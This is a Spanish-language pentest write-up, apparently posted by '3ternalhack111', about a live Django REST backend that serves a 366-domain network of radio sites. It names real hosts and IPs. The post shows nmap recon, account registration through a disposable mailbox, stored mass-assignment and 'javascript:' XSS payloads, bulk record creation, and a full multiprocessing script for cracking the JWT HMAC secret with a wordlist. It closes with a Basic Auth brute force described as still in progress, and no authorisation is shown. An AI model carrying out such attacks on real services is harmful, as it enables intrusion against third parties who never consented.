
por 3ternalhack111


<img width="210" height="90" alt="image" src="https://github.com/user-attachments/assets/f5076036-7f32-4542-8daa-970a460a97ea" />
: REGIONAL RADIOS / 366 dominios / 1 API escondida / por 3ternalhack111*

Mi primer pentest de verdad. Reconocimiento pasivo hasta encontrar un backend
Django REST expuesto y sus fallos. Todo desde Windows con PowerShell y curl.

Empece mirando un sitio de emisoras colombianas con el puerto 22 abierto.
Acabe encontrando la API real de todo un ecosistema de 366 dominios.
Registro abierto. Verificacion de email saltada. Mass assignment. XSS
almacenado. Y un Basic Auth que todavia aguanta.

## reconocimiento

```diff
PS C:\WINDOWS\system32> nmap -Pn -n -T4 --min-rate 5000 --max-retries 1 -p- --open 79.137.88.105 -oN puertos.txt
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-15 19:12 -0400
+Nmap scan report for 79.137.88.105
+Host is up (0.18s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 27.61 seconds
```

los puertos abiertos eran 22 80 y 443. y ya

```diff
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
```

<img width="532" height="142" alt="image" src="https://github.com/user-attachments/assets/58d95705-a52c-4941-9f95-942a05551a03" />


```diff
PS C:\WINDOWS\system32> nmap -sV -sC -Pn -n -p 22,80,443 79.137.88.105
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+80/tcp  open  http     nginx
+443/tcp open  ssl/http nginx
+|_http-title: 400 The plain HTTP request was sent to HTTPS port
+| ssl-cert: Subject: commonName=mytuner-radio.com
+| Subject Alternative Name: DNS:mytuner-radio.com, DNS:mytuner.mobi
+Service Info: OS: Linux
```

el certificado delata el nombre real. la IP pertenece a OVH

## el ssh

```diff
PS C:\WINDOWS\system32> nmap -Pn -n -p22 --script ssh-auth-methods 79.137.88.105
+| ssh-auth-methods:
+|   Supported authentication methods:
+|_    publickey
+
+PS C:\WINDOWS\system32> ssh -o StrictHostKeyChecking=no test@79.137.88.105
+test@79.137.88.105: Permission denied (publickey).
```

<img width="462" height="82" alt="image" src="https://github.com/user-attachments/assets/53d79a65-faa3-417b-88bd-022f9122adb1" />


solo publickey. sin usuario ni clave no hay entrada

## leyendo el front

```diff
PS C:\WINDOWS\system32> curl.exe -s https://www.emisorascolombianas.co/ -o pagina.html
PS C:\WINDOWS\system32> $js = Select-String -Path pagina.html -Pattern '<script[^>]+src="([^"]+)"' -AllMatches |
>>   ForEach-Object { $_.Matches } | ForEach-Object { $_.Groups[1].Value }
+== https://dish.cutletyet.com/polyfills-es/-BnMT-QBZq.js
+== https://www.googletagmanager.com/gtag/js?id=UA-41201130-28
+== https://cdn.regional-radios.app-mind.com/static/assets/js/app-d26561db.js
```

aqui viene el giro. en vez de lanzar un gobuster a lo loco lei el HTML y el
JavaScript. ahi esta el CDN de la empresa de verdad. descargo el bundle

```diff
PS C:\WINDOWS\system32> curl.exe -s "https://cdn.regional-radios.app-mind.com/static/assets/js/app-d26561db.js" -o app.js
PS C:\WINDOWS\system32> (Get-Item app.js).Length
+22124
+
PS C:\WINDOWS\system32> Format-Hex -Path app.js -Count 16
+Format-Hex : No se encuentra ningÃºn parÃ¡metro que coincida con el nombre del parÃ¡metro 'Count'.
```

buscaba strings en el fichero y no salia nada

```diff
PS C:\WINDOWS\system32> [regex]::Matches($c,'(?i)(api_?key|apikey|x-api-[a-z-]+|authorization|bearer|metadata)') | ForEach-Object {$_.Value} | Sort-Object -Unique
```

resulta que venia comprimido

```diff
PS C:\WINDOWS\system32> curl.exe -s --compressed "https://cdn.regional-radios.app-mind.com/static/assets/js/app-d26561db.js" -o app2.js
PS C:\WINDOWS\system32> (Get-Item app2.js).Length
+22124
```

## el front roto

en el HTML hay un atributo `data-api-base-url`

```diff
PS C:\WINDOWS\system32> foreach ($h in $hosts) {
>>   $b = curl.exe -s $h
>>   if ($b -match 'data-api-base-url="([^"]+)"') { "$h  ->  $($Matches[1])" } else { "$h  ->  (sin atributo)" }
>> }
+No se puede indizar en una matriz nula.
+En lÃ­nea: 8 CarÃ¡cter: 61
+
PS C:\WINDOWS\system32> foreach ($h in $hosts) {
>>   $b = (curl.exe -s $h) -join "`n"
>>   if ($b -match 'data-api-base-url="([^"]+)"') { "$h  ->  $($Matches[1])" }
>> }
+https://www.emisorascolombianas.co  ->  https://www.emisorascolombianas.co
+https://www.radio-espana.es  ->  https://www.radio-espana.es
+https://www.radio-en-vivo.mx  ->  https://www.radio-en-vivo.mx
```

apunta al propio dominio. pero `/api/` no existe ahi

```diff
PS C:\WINDOWS\system32> foreach ($h in $hosts) {
>>   $c = curl.exe -s -o NUL -w "%{http_code}" "$h/api/auth/user/"
>>   "$c  $h/api/auth/user/"
>> }
+404  https://www.emisorascolombianas.co/api/auth/user/
+404  https://www.radio-espana.es/api/auth/user/
+404  https://www.radio-en-vivo.mx/api/auth/user/
+404  https://www.radios-argentinas.org/api/auth/user/
+404  https://www.radios-chilenas.com/api/auth/user/
+404  https://www.radio-italiane.it/api/auth/user/
+404  https://www.radios-online.pt/api/auth/user/
```

el sistema de cuentas de 366 webs estaba roto

## la api de verdad

buscando por el nombre de la empresa aparecio el host de la API

```diff
PS C:\WINDOWS\system32> foreach ($d in $cand) {
>>   try { $r = Resolve-DnsName $d -ErrorAction Stop | Where-Object { $_.IPAddress }
>>         if ($r) { "$d -> $($r.IPAddress -join ',')" } else { "$d -> (sin A)" } }
>>   catch { "$d -> NXDOMAIN" }
>> }
+api.app-mind.com -> NXDOMAIN
+regional-radios.app-mind.com -> 2001:41d0:24f:6900::,79.137.88.105
+app-mind.com -> 2001:41d0:700:643e::,141.95.97.62
```

```diff
PS C:\WINDOWS\system32> curl.exe -si "https://regional-radios.app-mind.com/api/"
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Basic realm="Authorized Only"
```

<img width="483" height="116" alt="image" src="https://github.com/user-attachments/assets/75c69362-61c7-44ef-b48c-986bddc972bd" />


la raiz y `/admin/` estan detras de Basic Auth. pero `/api/` esta exento

```diff
PS C:\WINDOWS\system32> curl.exe -si "https://regional-radios.app-mind.com/api/auth/user/"
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Bearer realm="api"
+Allow: GET, PUT, PATCH, HEAD, OPTIONS
+{"detail":"Authentication credentials were not provided."}
```

Django REST Framework con simplejwt

## registro

```diff
PS C:\WINDOWS\system32> $reg = '{"email":"prueba123@prueba.com","password1":"12345678","password2":"12345678","display_name":"t","accepted_terms":true,"accepted_privacy":true}'
PS C:\WINDOWS\system32> curl.exe -si -X POST "$api/api/auth/register/" -H "Content-Type: application/json" -d $reg
+HTTP/1.1 400 Bad Request
+{"detail":"JSON parse error - Expecting property name enclosed in double quotes: line 1 column 2 (char 1)"}
```

PowerShell se comia las comillas. lo pase a fichero

```diff
PS C:\WINDOWS\system32> $reg | Out-File -Encoding ascii reg.json
PS C:\WINDOWS\system32> curl.exe -si -X POST "$api/api/auth/register/" -H "Content-Type: application/json" --data-binary "@reg.json"
+HTTP/1.1 201 Created
+{"detail":"Verification e-mail sent."}
```

registro libre. el unico freno es verificar el correo

## verificando el email

primero probe con 1secmail y no me respondia

```diff
PS C:\WINDOWS\system32> $id = (curl.exe -s "https://www.1secmail.com/api/v1/?action=getMessages&login=rr532297&domain=1secmail.com" | ConvertFrom-Json)[0].id
+No se puede indizar en una matriz nula.
```

pase a mail.tm que si funcionaba

```diff
PS C:\WINDOWS\system32> $addr = "rr" + (Get-Random -Maximum 999999) + "@$dom"
+ADDR = rr426327@maxxspace.com
+
PS C:\WINDOWS\system32> curl.exe -s "$mt/messages/$mid" -H "Authorization: Bearer $t"
+"text":"... https://regional-radios.app-mind.com/api/auth/register/account-confirm-email/Mw:1xHVmk:ZrP8DnOsUUuKu8AMW-f6hTKBpENujXnM8VeztCa8nUE/ ..."
```

el enlace del correo da 500

```diff
PS C:\WINDOWS\system32> curl.exe -si "$url"
+HTTP/1.1 500 Internal Server Error
```

y el POST al enlace da 403 por CSRF. pero existe un endpoint de API

```diff
PS C:\WINDOWS\system32> foreach ($p in @("/api/auth/register/verify-email/","/api/auth/verify-email/")) {
>>   $c = curl.exe -s -o NUL -w "%{http_code}" "$api$p"; "$c  $p"
>> }
+405  /api/auth/register/verify-email/
+404  /api/auth/verify-email/
+
PS C:\WINDOWS\system32> curl.exe -si -X POST "$api/api/auth/register/verify-email/" --data-binary "@ver.json"
+HTTP/1.1 200 OK
+{"detail":"ok"}
```

## el login

cuenta verificada. entro

```diff
PS C:\WINDOWS\system32> $r = curl.exe -s -X POST "$api/api/auth/login/" --data-binary "@log.json"
+{"access":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","refresh":"","user":{"pk":9,...}}
```

JWT HS256 y cookies `rr_access` y `rr_refresh` en HttpOnly

copie el token a mano y me falto pegarlo

```diff
PS C:\WINDOWS\system32> $tok = "PEGA_AQUI_EL_TOKEN"
PS C:\WINDOWS\system32> curl.exe -si "$api/api/auth/user/" -H "Authorization: Bearer $tok"
+HTTP/1.1 401 Unauthorized
+{"detail":"Authorization header must contain two space-delimited values","code":"bad_authorization_header"}
```

## probando endpoints

en vez de adivinar el modelo de datos pedi los metodos permitidos

```diff
PS C:\WINDOWS\system32> foreach ($p in @("/api/user/favorites/","/api/user/votes/","/api/user/sync/")) {
>>   "== $p"
>>   curl.exe -si "$api$p" | Select-String "^(HTTP|Allow|WWW-Authenticate)"
>> }
+== /api/user/favorites/
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Bearer realm="api"
+Allow: GET, POST, HEAD, OPTIONS
+== /api/user/votes/
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Bearer realm="api"
+Allow: GET, POST, HEAD, OPTIONS
+== /api/user/sync/
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Bearer realm="api"
+Allow: POST, OPTIONS
```

<img width="537" height="116" alt="image" src="https://github.com/user-attachments/assets/ac60b131-1bbb-46eb-a70c-ceadba367a9c" />


## el content_type

el POST pedia `content_type` y `object_id` y no sabia que modelo era

```diff
PS C:\WINDOWS\system32> foreach ($ct in @("station","radio","radiostation","radio_station","radios","radiostations","Station","RadioStation")) {
>>   '{"content_type":"' + $ct + '","object_id":1}' | Out-File -Encoding ascii fav.json
>>   $c = curl.exe -s -o NUL -w "%{http_code}" -X POST "$api/api/user/favorites/" --data-binary "@fav.json"
>>   "$c  $ct"
>> }
+400  station
+201  radio
+400  radiostation
+400  radio_station
+400  radios
+400  radiostations
+400  Station
+400  RadioStation
```

el campo correcto es `radio`

## mass assignment

```diff
PS C:\WINDOWS\system32> '{"content_type":"radio","object_id":5,"name":"INJECT","slug":"../evil","image_url":"http://evil.tld/x.png","extra_data":{"pwn":true},"country_code":"ZZ"}' | Out-File -Encoding ascii ma.json
PS C:\WINDOWS\system32> curl.exe -si -X POST "$api/api/user/favorites/" --data-binary "@ma.json"
+HTTP/1.1 201 Created
+{"id":3,"content_type":"radio","object_id":5,"country_code":"ZZ","slug":"../evil","name":"INJECT","image_url":"http://evil.tld/x.png","extra_data":{"pwn":true},...}
```

`name` `slug` `image_url` `url` y `extra_data` los controla el cliente

<img width="572" height="113" alt="image" src="https://github.com/user-attachments/assets/fa9d044b-1067-48cc-a63b-6d6aa7f3b0c0" />


## xss

```diff
PS C:\WINDOWS\system32> curl.exe -si -b cjA.txt "$api/api/user/recent/1/"
+HTTP/1.1 200 OK
+{"id":1,"item_type":"radio","object_id":1,"name":"INJECT","image_url":"http://evil.tld/x.png","url":"javascript:alert(1)","extra_data":{"pwn":true}}
```

el `name` se guarda sin escapar y el `url` acepta `javascript:`

## creacion masiva

aqui el token ya me habia caducado y no me di cuenta

```diff
PS C:\WINDOWS\system32> curl.exe -si -b cjA.txt -X POST "$api/api/user/favorites/" --data-binary "@bulk.json"
+curl: option --data-binary: error encountered when reading a file
+curl: try 'curl --help' for more information
+
PS C:\WINDOWS\system32> '{"content_type":"podcast","object_id":1,"name":"Pod","extra_data":{"artist":"X"}}' | Out-File -Encoding ascii pod.json
PS C:\WINDOWS\system32> curl.exe -si -b cjA.txt -X POST "$api/api/user/favorites/" --data-binary "@pod.json"
+HTTP/1.1 401 Unauthorized
+{"detail":"Authentication credentials were not provided."}
```

volvi a loguear y arregle el bulk

```diff
PS C:\WINDOWS\system32> curl.exe -s -c cjA.txt -X POST "$api/api/auth/login/" --data-binary "@logA.json" -o NUL
+
PS C:\WINDOWS\system32> $l = "["
>> foreach ($i in 100..150) { $l += '{"content_type":"radio","object_id":' + $i + ',"name":"Bulk' + $i + '","country_code":"CO"},' }
>> $l = $l.TrimEnd(",") + "]"
>> $l | Out-File -Encoding ascii bulk.json
>> (Get-Item bulk.json).Length
+3981
+
PS C:\WINDOWS\system32> curl.exe -si -b cjA.txt -X POST "$api/api/user/favorites/" --data-binary "@bulk.json"
+HTTP/1.1 201 Created
```

51 favoritos en un solo POST

## validacion

```diff
PS C:\WINDOWS\system32> curl.exe -si -X POST "$api/api/user/favorites/" --data-binary "@long.json"
+HTTP/1.1 400 Bad Request
+{"name":["Ensure this field has no more than 255 characters."]}
+
PS C:\WINDOWS\system32> curl.exe -si -X POST "$api/api/user/favorites/" --data-binary "@badct.json"
+HTTP/1.1 400 Bad Request
+{"content_type":["\"nada\" is not a valid choice."]}
+
PS C:\WINDOWS\system32> curl.exe -si -X POST "$api/api/user/favorites/" --data-binary "@badurl.json"
+HTTP/1.1 400 Bad Request
+{"image_url":["Enter a valid URL."]}
```

eso esta bien. lo que no esta bien es el duplicado

```diff
PS C:\WINDOWS\system32> foreach ($i in 1..25) {
>>   $r = (curl.exe -s -X POST "$api/api/user/favorites/" --data-binary "@fx.json") -join ""
>>   "$i => $r"
>> }
+1 => <h1>Server Error (500)</h1>
+2 => <h1>Server Error (500)</h1>
```

un favorito duplicado devuelve 500 en vez de 400

## idor

```diff
PS C:\WINDOWS\system32> curl.exe -si "$api/api/user/favorites/1/" -H "Authorization: Bearer $tokB"
+HTTP/1.1 404 Not Found
+{"detail":"No UserFavorite matches the given query."}
+
PS C:\WINDOWS\system32> curl.exe -si "$api/api/user/recent/1/" -H "Authorization: Bearer $tokB"
+HTTP/1.1 404 Not Found
+{"detail":"No UserRecentItem matches the given query."}
```

no hay IDOR. aislamiento correcto por usuario

## rate limit

```diff
PS C:\WINDOWS\system32> foreach ($i in 1..40) {
>>   $c = curl.exe -s -o NUL -w "%{http_code}" -X POST "$api/api/auth/login/" -d '{"email":"nadie@x.com","password":"x"}'
>>   if ($c -ne 400) { "$c en el intento $i" }
>> }
+429 en el intento 31
+fin en 30.6 segundos
```

30 por minuto en login y registro. minimo 8 caracteres de contrasena

```diff
PS C:\WINDOWS\system32> curl.exe -si -X POST "$api/api/auth/register/" --data-binary "@weak.json"
+HTTP/1.1 400 Bad Request
+{"password1":["Ensure this field has at least 8 characters."]}
```

## oauth de google

```diff
PS C:\WINDOWS\system32> curl.exe -si "$api/api/auth/google/login/"
+HTTP/1.1 302 Found
+Location: https://accounts.google.com/o/oauth2/v2/auth?client_id=&redirect_uri=...
```

el `client_id` va vacio

## el secret key

con el SECRET_KEY podria firmar un JWT con cualquier `user_id` y entrar en las
366 webs. intente romper la firma HS256

```diff
PS C:\WINDOWS\system32> python crack.py
+palabras cargadas: 14344390
+paso 1 (plano): sin resultado
+Traceback (most recent call last):
+  File "C:\WINDOWS\system32\crack.py", line 27, in <module>
+    if ok(w+suf):
+  File "C:\WINDOWS\system32\crack.py", line 10, in ok
+    return b64u(hmac.new(c, msg, hashlib.sha256).digest()) == target
+KeyboardInterrupt
```

lo pase a multiproceso

```diff
PS C:\WINDOWS\system32> python crack2.py
+palabras: 14344390 | nucleos: 8
+sin resultado
```

14.3 millones de palabras de rockyou con sufijos y capitalizacion. nada.
conclusion: es un SECRET_KEY autogenerado por Django

la unica via es el Basic Auth. y ahi sigue

<img width="682" height="87" alt="image" src="https://github.com/user-attachments/assets/b94f0c91-8725-4f1f-b4d0-b1138e04333f" />


## el script

```python
import hmac, hashlib, base64, sys, os
from multiprocessing import Pool

tok = open('tok.txt').read().strip()
h, p, s = tok.split('.')
msg = (h + '.' + p).encode()
target = s

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
SUFS = (b'1',b'12',b'123',b'1234',b'!',b'0',b'2024',b'2025',b'2026',b'@',b'#',b'_',b'-')

def check(w):
    if b64u(hmac.new(w, msg, hashlib.sha256).digest()) == target: return w
    for sf in SUFS:
        if b64u(hmac.new(w+sf, msg, hashlib.sha256).digest()) == target: return w+sf
    c = w[:1].upper()+w[1:]
    if c != w and b64u(hmac.new(c, msg, hashlib.sha256).digest()) == target: return c
    return None

def chunk(ws):
    for w in ws:
        r = check(w)
        if r: return r
    return None

if __name__ == '__main__':
    words = []
    with open('rockyou.txt','rb') as f:
        for line in f:
            w = line.rstrip(b'\r\n')
            if w: words.append(w)
    print("palabras:", len(words), "| nucleos:", os.cpu_count())
    CH = 20000
    parts = [words[i:i+CH] for i in range(0, len(words), CH)]
    with Pool() as pool:
        for r in pool.imap_unordered(chunk, parts):
            if r:
                print("SECRET =", r.decode(errors='replace'))
                pool.terminate(); sys.exit(0)
    print("sin resultado")
```

## lo que esta bien

- no hay IDOR en favoritos ni en recientes
- la firma del JWT se valida. `alg:none` rechazado. `token_type` comprobado
- rate limit real de 30 por minuto
- minimo 8 caracteres de contrasena
- cabeceras de seguridad completas. HSTS nosniff y X-Frame-Options
- validacion de longitud y de formato en los campos

## linea de tiempo

1. puerto 22 abierto en un sitio de radio
2. reverse IP. 366 dominios
3. lectura del JavaScript. endpoints y empresa real
4. `/api/` 404 en todos los paises
5. backend localizado un subdominio mas alla
6. registro. buzon desechable. email verificado
7. metodos permitidos de los endpoints
8. mass assignment XSS bulk y 500
9. fuerza bruta al SECRET_KEY. fallo
10. fuerza bruta al Basic Auth. en curso

## lecciones

- leer el JavaScript rinde mas que escanear
- los endpoints te dicen solos que metodos aceptan
- un front roto puede esconder un backend vivo
- los 500 en validacion son un regalo
- el rate limit no salva un secreto debil

## recomendaciones

1. arreglar el `data-api-base-url` del front. apunta a si mismo
2. validar los campos del cliente en favoritos y recientes
3. escapar `name` y filtrar esquemas en `url`
4. devolver 400 en duplicados
5. validar la GenericForeignKey
6. rellenar el `client_id` de Google
7. poner un SECRET_KEY fuerte y explicito

## herramientas

nmap curl PowerShell hackertarget mail.tm y dos scripts propios de cracking en
Python con hmac y multiprocessing

---

hecho por 3ternalhack111
